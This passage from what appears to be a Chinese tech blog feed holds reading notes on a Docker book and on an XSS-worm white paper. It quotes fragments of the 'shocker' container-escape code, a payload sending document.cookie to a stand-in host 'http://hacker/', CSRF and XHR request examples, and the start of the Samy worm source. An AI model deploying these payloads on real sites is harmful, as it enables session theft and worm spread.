主机对镜像进行构建】</li></ul></li><li>发布镜像到Registry pash</li><li>其他主机 Pull 到本地</li><li>本地运行容器实例并验证</li><li>至此完成一个docker 的helloworld。</li></ul><p>这里对这个场景进行简单的描述，后面将会有操作的实例。</p><h2 id="Docker-的安全"><a href="#Docker-的安全" class="headerlink" title="Docker 的安全"></a>Docker 的安全</h2><p>由于 Docker 和物理主机是公用同一个内核，因此受攻击的面将会特别的广，<strong>而且一旦容器内的程序导致了内核的panic，物理机的内核也将 Painc</strong></p><p>共用内核使用Cgroup和Namespace 实现了容器隔离和资源限制的目的。Namespace 目前不是十分完善。<strong>所以导致了虚拟容器中的逃逸问题</strong>，（比如 PS 使用的 procfs ，就可以看到物理机的所有的 ps）这个是特性导致，所以很难完美的处理。现在应用的安全策略：</p><ol><li>Cgroup    进行资源限制</li><li>ulimit    资源限制</li><li>容器组网    安全</li><li>容器+全虚拟化    公有云，安全需求很高的解决方案</li><li>监控    <code>docker ps -a</code> 监控容器状态</li><li>文件级防护    对文件的权限进行严格的控制</li><li>capability</li><li>SELinux    严格的DAC ，资助访问控制</li><li>AppArmor</li><li>Seccomp</li><li>grsecurity    内核的 patch 大大提高安全性</li></ol><h3 id="安全示例"><a href="#安全示例" class="headerlink" title="安全示例"></a>安全示例</h3><h4 id="主机逃逸"><a href="#主机逃逸" class="headerlink" title="主机逃逸"></a>主机逃逸</h4><p><strong>shocker攻击</strong> 通过 <code>open_by_handle_at</code> 和 <code>name_to_handle_at</code> 这两个系统调用实现。先在容器内打开一个文件描述符，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/.dockerinit"</span>, O_RDONLY);</span><br></pre></td></tr></table></figure><p>之后使用 <code>open_by_handle_at</code> 获取文件的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY);</span><br><span class="line">dir = fdopendir(fd)</span><br></pre></td></tr></table></figure><p>并且在这里得到其打开的所有目录？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de = readdir(dir);</span><br></pre></td></tr></table></figure><p>得到其目录的结构体，之后进行对比与 <code>/etc/shadow</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncmp</span>(de-&gt;d_name, path, <span class="built_in">strlen</span>(de-&gt;d_name));</span><br></pre></td></tr></table></figure><p>找到了包含 shadow 的de目录之后，开始穷举句柄：</p><hr><p>后面略过部分的内容。讲解了Libcontainer 的一些技术原理。</p><h2 id="Docker-实践篇"><a href="#Docker-实践篇" class="headerlink" title="Docker 实践篇"></a>Docker 实践篇</h2><h3 id="Dockerfile-的hello-world"><a href="#Dockerfile-的hello-world" class="headerlink" title="Dockerfile 的hello world"></a>Dockerfile 的hello world</h3><p>Dockerfile 用来制作镜像，像是一个蓝图一样，</p><ul><li>以 # 为注释</li><li>每一行一个命令</li><li>四部分组成<ul><li>基础镜像信息</li><li>维护者信息</li><li>镜像操作指令</li><li>容器启动指令</li></ul></li></ul><p>书中给了一个 Nginx 的基础镜像的配置，这里进行cpoy：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">MAINTAINER</span> admin xxx</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"[软件源]"</span> &gt;&gt; /etc/apt/source.list<span class="comment"># 添加软件源</span></span></span><br><span class="line"><span class="bash">RUN apt-get update &amp;&amp; apt-get install -y nginx </span></span><br><span class="line"><span class="bash">RUN <span class="built_in">echo</span> <span class="string">"\ndeamon off"</span> &gt;&gt; /etc/nginx/nginx.conf<span class="comment"># 写配置前台运行</span></span></span><br><span class="line"><span class="bash">CMD /usr/sbin/nginx<span class="comment"># 启动服务</span></span></span><br></pre></td></tr></table></figure><hr><table><thead><tr><th>KeyWord</th><th>DESC</th></tr></thead><tbody><tr><td>FROM <image></image></td><td>继承自哪个镜像</td></tr><tr><td>MAINTAINER <name></name></td><td>指定维护者信息</td></tr><tr><td>RUN <command></td><td>执行SHELL指令，类似 <code>sh -c</code></td></tr><tr><td>EXPOSE</td><td>暴露容器端口</td></tr><tr><td>CMD</td><td>启动容器时执行的命令，<strong>只能有一条</strong></td></tr><tr><td>VOLUME</td><td>创建挂载点</td></tr><tr><td>ENV <key> <value></value></key></td><td>定义环境变量</td></tr><tr><td>ADD <src> <dest></dest></src></td><td>复制指定src(URL，tar，相对路径)的指定文件到目的卷</td></tr><tr><td>COPY \<src> \<dset></dset></src></td><td>复制本地主机的文件到容器的目</td></tr></tbody></table><hr><h3 id="Docker-镜像-的制作与启动"><a href="#Docker-镜像-的制作与启动" class="headerlink" title="Docker 镜像 的制作与启动"></a>Docker 镜像 的制作与启动</h3><p>书中给出了一个DockerFile 的示例：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> busybox</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> date;sleep 100;date</span></span><br><span class="line"><span class="bash">RUN <span class="built_in">echo</span> <span class="string">"abc"</span> &gt; /mytest</span></span><br><span class="line"><span class="bash">RUN date;sleep 100; date</span></span><br><span class="line"><span class="bash">CMD /bin/bash</span></span><br></pre></td></tr></table></figure><p>RUN 命令都是在容器内部执行的，最后的CMD为最后返回的内容。</p><p>在书中是以一个 Tomcat 的例子来演示的。这里主要设计到了镜像的拉去，以及 卷的 静态挂载，SSL 证书的生成。之后贼了容器内部，把 证书保存在 指定的目录，并且修改一下 server 的配置。</p><p>完成所有的配置之后，直接进行一次 commit。之后 跑容器实例即可。</p><p><strong>源码导入</strong> 使用静态导入以及动态导入两种方式。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tomecat:https</span><br><span class="line"><span class="keyword">MAINTAINER</span> xxx</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./websrc /usr/<span class="built_in">local</span>/tomecat/webapps/myproj</span></span><br></pre></td></tr></table></figure><p><strong>动态挂载</strong> 把本地的数据卷挂载在容器中，现在船舰一个挂载点，把文件动态挂载到容器中。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tomcat:http</span><br><span class="line"><span class="keyword">MAINTAINER</span> xxx </span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /usr/<span class="built_in">local</span>/tomcat/webapps/myproj</span></span><br><span class="line"><span class="bash">VOLUME /usr/<span class="built_in">local</span>/tomcat/webapps/myproj</span></span><br></pre></td></tr></table></figure><p>在启动容器的时候指定参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -ti -v $(pwd)/websrc:/usr/local/tomcat/webapps/myproj</span><br></pre></td></tr></table></figure><hr><h3 id="Docker-的架构"><a href="#Docker-的架构" class="headerlink" title="Docker 的架构"></a>Docker 的架构</h3><p>微服务之核心就在于此,把服务的多个部分以容器的形式，分散在各处。比如实现一个 web服务架构，除了上面的web服务器之外，还有后端的数据库，或者是 一些其他的模块。</p><p><strong>Docker-compose</strong>  提供了一个Docker 的工程的管理，可以实现对多个容器的构成一个项目的整合。</p><h2 id="Docker-的集群管理"><a href="#Docker-的集群管理" class="headerlink" title="Docker 的集群管理"></a>Docker 的集群管理</h2><p>在生产环境的使用的时候，当然是需要进行统一管理的。这里在书中就引入了几个工具：</p><h3 id="Compose"><a href="#Compose" class="headerlink" title="Compose"></a>Compose</h3><blockquote><p>一个应用往往有多个组件构成，Docker 的最佳实践是一个容器运行一个进程</p></blockquote><p>所以为了实现容器之间的同意管理，以及协作工作，这里就有了 Compose 。</p><h3 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h3><p>简化Docker 安装的工具</p><h3 id="Swarm"><a href="#Swarm" class="headerlink" title="Swarm"></a>Swarm</h3><p>集群管理工具，实现把多个Docker主机组成的系统，整合为统一的虚拟Docker 主机。</p><blockquote><p>swap,plug and play</p></blockquote><hr><p><strong>K8S</strong></p><h2 id="FAQ（Frequently-asked-questions-）"><a href="#FAQ（Frequently-asked-questions-）" class="headerlink" title="FAQ（Frequently asked questions ）"></a>FAQ（<em>Frequently asked questions</em> ）</h2><p>书后面的 FAQ，这里挑选部分摘录：</p><ul><li>Docker 容器中管理多个进程<ul><li>使用 <code>supervisord,runit</code>等进行进程的统一管理，保持管理进程工作即可</li></ul></li><li>ATTACH 到容器之后怎么退出<ul><li>操作和 <code>screen</code> 有些类似使用 <code>ctrl+P，ctrl+Q</code> 进行退出，容器继续进行，如果使用 <code>ctrl+c</code> 可能导致进程结束从而容器退出</li></ul></li></ul><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>通过这本书，对Docker 的认识，和使用更上了一个台阶，后面准备实现一个 基于Docker 的在线编译执行的东西。</p><p>基础构想是 使用 Nginx 跑 Python的CGI，post 源码，之后编译执行，再返回前端，把这个打包成镜像</p><p>下一步就是把服务拆开，单容器单进程，把 nginx 和 uwsgi 拆分开来，使用多容器合作。</p><p>后面看看 Docker 的源码吧。</p><p>书后推荐书籍：    </p><ul><li>Docker 技术入门与实践    9787111488521</li><li>Docker 源码分析            9787111510727</li><li>Linux 内核设计与实现        </li><li>Linux 内核精髓</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;书
      
    
    </summary>
    
      <category term="读本好书吧" scheme="https://blog.diglp.xyz/categories/%E8%AF%BB%E6%9C%AC%E5%A5%BD%E4%B9%A6%E5%90%A7/"/>
    
    
      <category term="读书笔记" scheme="https://blog.diglp.xyz/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息安全" scheme="https://blog.diglp.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>读本好书 《XSS 蠕虫 &amp; 病毒》</title>
    <link href="https://blog.diglp.xyz/2018/12/24/Book_XSS_worm&amp;virus/"/>
    <id>https://blog.diglp.xyz/2018/12/24/Book_XSS_worm&amp;virus/</id>
    <published>2018-12-23T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>突然一个状态的转变,总是需要好解的转变的时间。</p><p>事前比较多，感觉自己在知识的荒野上已经漫步了好久。时而有着恐慌的感觉。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：XSS 蠕虫 &amp; 病毒</li><li>副标题：即将发生的威胁与最好的防御</li><li>作者：June 2007 – updated Jeremiah Grossman</li><li>翻译：<span class="exturl" data-url="aHR0cDovL2hpLmJhaWR1LmNvbS9mb295aW5n" title="http://hi.baidu.com/fooying">Fooying<i class="fa fa-external-link"></i></span>（知道创宇安全研究团队）</li><li>来源：<span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8veHNzLXdvcm1zLWFuZC12aXJ1c2VzL2NvbnRlbnQvMC5odG1s" title="https://wizardforcel.gitbooks.io/xss-worms-and-viruses/content/0.html">GitBook<i class="fa fa-external-link"></i></span></li></ul><p>一本篇幅短小的书，主要是将关于 XSS蠕虫 的书籍， 这个蠕虫其实都不陌生，一年前，记得qq空间里面的自动转发，这个就是和书里的主角有关系了。</p><p>简单来说，XSS 在用户的浏览器端注入了目标代码，用于伪造了用户的操作，然而使用 XSS 的蠕虫，可以在用户的repost 的内容里面再次插入恶意JS 实现了自我的复制以及传播。</p><p>这篇文章， 作为对这个技术的了解以及认识吧。</p><blockquote><p>在本白皮书中，我们将提供一个关于 XSS 的概述;定义 XSS 蠕虫;检验传播方式，感染率和潜在的影响。最重要的是，我们将描述如何立即采取措施，企业可以采取以捍卫他们的网站。</p></blockquote><h2 id="XSS蠕虫的知识点"><a href="#XSS蠕虫的知识点" class="headerlink" title="XSS蠕虫的知识点"></a>XSS蠕虫的知识点</h2><p>这里用自己的观点总结一下：</p><ol><li><p>来自于可以有用户输入的地方</p></li><li><p>XSS 依附于web 比桌面的 应用程序的 worm 更加快速广泛</p></li><li><blockquote><p>与操作系统（Windows，Linux 和 Macintosh OS X 等等）无关，因为是在 Web 浏览器发生并执行的。</p></blockquote></li><li><blockquote><p>能够避免网络堵塞,因为通过 Web 服务器到 Web 浏览器（客户端 - 服务器）模式传播，而不是一个典型的盲目的 对等模型。</p></blockquote></li><li><p>XSS蠕虫 依附于 web 的服务本身。</p></li><li><blockquote><p>比传统互联网病毒更容易停下来，因为拒绝感染网站的访问可以被隔离以阻止传播。</p></blockquote><p>因为XSS 的漏洞是存在于 web 页面之上，出现了可能存储XSS的注入js 的地方，但是一旦进行过滤，或者，对其行为进行阻止，其传播途径便受阻了。</p></li></ol><h2 id="XSS知识点"><a href="#XSS知识点" class="headerlink" title="XSS知识点"></a>XSS知识点</h2><p>非持久型XSS，也成为反射性的XSS。用户输入在一个动作后会出现在用户页面上，二实际上并不会进行存储。</p><p>所以可以理解为，是用户构建的一次性的反射XSS , 一般出现在 <strong>get型的搜索页面</strong>  中。因为用户提交的搜索内容，会再次的出现在了页面之中。座椅这样被可以出发了，XSS。</p><p>当然，反射型的 XSS 在进行构造之后通过用户点击进行触法，多半用于phishing 的过程之中。</p><p>eg:在存在反射型的XSS 的时候可以构造如下链接形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://victim/search.pl?search=test+search+[payload]</span><br><span class="line">”&gt;&lt;SCRIPT&gt;alert(‘XSS%20Testing’)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>这样我们的 payload 就出现在了搜索结果的页面中去，所以就可以被触发。</p><p>一般用于钓鱼链接，当然一旦有了入口就可以实现更加复杂的功能了。</p><p>使用如下的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;SCRIPT&gt;var+img=new+Image();img.src=&quot;http://hacker/”%20+%20document.cookie;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><p>这样就构造了一个DOM的对象，就向目标网站提交了用户的 cookies。（当然也可使用 ajax 进行高级操作）。</p><hr><p>非持久型XSS，这一类的XSS 就是危害比较大的类型，多存在于留言板之类用于存储并且显示用户输入的地方。用户输入的内容没有经过严格的检测，导致直接在页面上被加载以及解析，导致访问该页面的用户都受到影响。</p><p>危害性往往的是高于非持久性的。具体的利用细节，实际上也是对过滤进行 bypass ， 之后注入js 等待用户的触发。</p><h2 id="XSS-的传播方法"><a href="#XSS-的传播方法" class="headerlink" title="XSS 的传播方法"></a>XSS 的传播方法</h2><blockquote><p>XSS 蠕虫病毒可能会使 得浏览器进行发送电子邮件，转账，删除/修改数据，入侵其他网站，下载非法内容，以及许多其他形式的恶意活动。 用最简单的方式去理解，就是如果没有适当的防御，在网站上的任何功能都可以在未经用户许可的情况下运行。</p></blockquote><hr><p>XSS 的漏洞被利用在传播的时候，通常是 <code>HTML/Javascript</code>的代码。使用 </p><ul><li>嵌入的HTML标签</li><li>JavaScript DOM的对象</li><li>XMLHTTPRequest（XHR）</li></ul><hr><h3 id="嵌入的HTML标签"><a href="#嵌入的HTML标签" class="headerlink" title="嵌入的HTML标签"></a>嵌入的HTML标签</h3><p>一些html的标签，可以在加载的时候去请求非同源的资源。比如，img 的图像标签便可以实现这样的一个功能。</p><p>使用 img 的src属性可以在加载页面的时候，对远程的主机进行请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">”http://www.google.com/search?hl</span>=<span class="string">en&amp;q</span>=<span class="string">whitehat+security&amp;btnG</span>=<span class="string">Google+Search”</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的请求里面，知识进行了一次对 google 的请求，当然，这里的地址便可以模拟一次用户的请求，比如：增加删除好友。这是一个 get 的请求，当然也可以通过get 的方式向，目标主机传递当前的数据。</p><hr><h3 id="JavaScript-和-DOM"><a href="#JavaScript-和-DOM" class="headerlink" title="JavaScript 和 DOM"></a>JavaScript 和 DOM</h3><p><code>DOM = document object model</code>  这里一样可以使用DOM对象，实现一个对非同源站点的请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://www.google.com/search?hl=en&amp;q=whitehat+security&amp;btnG=Google+Search"</span></span><br></pre></td></tr></table></figure><p>通过改变图像的src属实现去其他的请求。</p><h3 id="XmlHttpRequest-XHR"><a href="#XmlHttpRequest-XHR" class="headerlink" title="XmlHttpRequest (XHR)"></a>XmlHttpRequest (XHR)</h3><p><code>AJAX (异步 JavaScript 和 XML)</code> JQuery中包含 ajax 的功能，一样实现对远程主机提交数据。</p><p>第一个XSS蠕虫在 2005年10月4日，</p><blockquote><p>使用一些绕过技 术，Samy 成功上传了他的代码。当一个通过身份验证 MySpace 的用户观看 Samy 的个人资料，该蠕虫病毒的 payload 使用 XHR，使得用户的网页浏览器发送请求，增加 Samy 为朋友，包括加 Samy 为他英雄（译者注：类似微博关注）（“但最重要的是，加 Samy 为英雄这点”，如图 6），并用恶意代码的副本改变用户的个人资料。当用户访问 Samy 或 者其他受感染用户的个人资料页，他们基本上在打开浏览器时就受到攻击。</p></blockquote><p>这里的vector 是关注了目标用户，payload 是在用户的个人信息上插入了XSS的代码。</p><h2 id="XSS-蠕虫和常规的桌面蠕虫"><a href="#XSS-蠕虫和常规的桌面蠕虫" class="headerlink" title="XSS 蠕虫和常规的桌面蠕虫"></a>XSS 蠕虫和常规的桌面蠕虫</h2><table><thead><tr><th>信息</th><th>时间</th><th>数量</th><th>voctor</th></tr></thead><tbody><tr><td>Code Red I 和 Code Red II(红色代码)</td><td>2001 年 7 月 12 日</td><td>275,000</td><td>IIS Web 服务的缓冲区溢出</td></tr><tr><td>Slammer(地狱)</td><td>2003 年 1 月 25 日</td><td>55,000</td><td>Microsoft SQL Server 缓冲 区溢出漏洞</td></tr><tr><td>Blaster(冲击波)</td><td>2003 年 8 月 11 号</td><td>336,000</td><td>远程过程调用（RPC）</td></tr><tr><td>Samy</td><td></td><td>1,000,000</td></tr></tbody></table><blockquote><p>XSS 蠕虫和病毒有一个分布的中心点，Web 服务器，并且执行只发生在 Web 浏览器。接下来，攻击代码只从 Web 服务器发送到浏览器，反之亦然（见图 9），而不是从浏览器到浏览器或其他蠕虫的对等情况。这个特性减少了 网络噪声的体积。此外，每个网站访问代表一个活的计算机和可能的受害者，因为 XSS 恶意软件是不依赖于操作系 统。因此，感染的成功率要大得多。</p></blockquote><p>严格的分析 XSS 蠕虫之所以更加广泛传播的原因。其传播方式部署对等的。</p><blockquote><p>在本白皮书中开头，我们问：“拥有和控制着超过一百万可支配的 Web 浏览器和千兆带宽，可以做什么？”大规模的分布式拒绝服务攻击（DDoS）是一个简单的答案。让我们保守地说，每个浏览器有一个 128 Kb / s 的平均速 度（千比特/秒），并能产生一个 HTTP 请求，每秒的组合拨号，DSL，电缆，和 T-1 连接。其结果将是 128,000,000 Kb/ s 或 122 Gb / s 的吞吐量和每秒 1,000,000 HTTP 请求- 无疑是一个巨大的资源集合的访问。</p></blockquote><p>这样无疑会有十分巨大的受控资源。</p><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>在用户的层面上：</p><blockquote><ol><li><p>点击链接发送电子邮件或即时消息时一定要谨慎。可疑的过长链接，尤其是那些看起来像是包含 HTML 代码 的链接。如果有疑问，手动输入网址到您的浏览器地址栏进行访问。</p></li><li><p>对于 XSS 漏洞，没有网络浏览器有一个明显的安全优势。话虽如此，但作者喜欢 Firefox 浏览器。为了获得 额外的安全性，可以考虑安装一些浏览器插件，如 NoScript25（Firefox 扩展插件）或 Netcraft 工具栏 26。</p></li><li><p>虽然不是 100％有效，但是避开可疑网站，如那些提供黑客自动化工具，warez，或色情的网站是明智的。</p></li></ol></blockquote><p>在开发者的角度上说：</p><ul><li>在敏感操作的时候需要进行验证码请求，避免直接使用反射型的XSS进行请求</li><li>提交内容进行严格过滤</li></ul><h2 id="书中的附录"><a href="#书中的附录" class="headerlink" title="书中的附录"></a>书中的附录</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FORM</span> <span class="attr">ACTION</span>=<span class="string">”http://server/path/”</span> <span class="attr">NAME</span>=<span class="string">”myform”</span> <span class="attr">METHOD</span>=<span class="string">”POST”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”HIDDEN”</span> <span class="attr">NAME</span>=<span class="string">”Username”</span> <span class="attr">VALUE</span>=<span class="string">”Foo”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”HIDDEN”</span> <span class="attr">NAME</span>=<span class="string">”Password”</span> <span class="attr">VALUE</span>=<span class="string">”Bar”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里构建的一个表单，一样可以使用 JS 进行提交</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT language=”JavaScript”&gt; <span class="built_in">document</span>.myform.submit();</span><br><span class="line">&lt;<span class="regexp">/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure><hr><p>通过 XHR 进行模拟请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.open(‘GET’, ‘http:<span class="comment">//server/path)/’, true);</span></span><br><span class="line">req.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        alert(req.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">req.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h2 id="Samy-蠕虫的源码-以及-个人的解读"><a href="#Samy-蠕虫的源码-以及-个人的解读" class="headerlink" title="Samy 蠕虫的源码 以及 个人的解读"></a>Samy 蠕虫的源码 以及 个人的解读</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=mycode style=”BACKGROUND: url(<span class="string">'javascript:eval(document.all.mycode.expr)'</span>)” expr=”</span><br><span class="line"><span class="keyword">var</span> B = <span class="built_in">String</span>.fromCharCode(<span class="number">34</span>);</span><br><span class="line"><span class="keyword">var</span> A = <span class="built_in">String</span>.fromCharCode(<span class="number">39</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> C;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> D = <span class="built_in">document</span>.body.createTextRange(); C = D.htmlText</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (C) &#123;</span><br><span class="line">        <span class="keyword">return</span> C</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">'document.body.innerHTML'</span>)</span><br><span class="line">    